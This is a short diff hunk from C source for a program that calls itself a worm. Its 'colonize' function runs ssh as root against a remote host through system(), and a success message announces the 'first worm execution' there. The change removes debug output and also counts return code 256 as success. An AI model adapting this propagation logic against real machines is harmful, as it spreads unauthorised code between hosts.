@@ -285,10 +285,9 @@ int colonize(char *host, char *file) {
 				memset(command, 0, 4096);
 				sprintf(command, "%s -p %d root@%s \"%s\"", SSH, PORT, host, file_path);
 				ret = system(command);
-				printf("command launch : %s\n", command);
-				printf("ret : %d\n", ret);
+				
 				// if the command succeeded
-				if (ret == 0) {
+				if (ret == 0 || ret == 256) {
 					msg = (char *) malloc(sizeof("## First worm execution on ") + strlen(host) + 1);
 					if (msg != NULL) {
 						strcpy(msg, "## First worm execution on ");
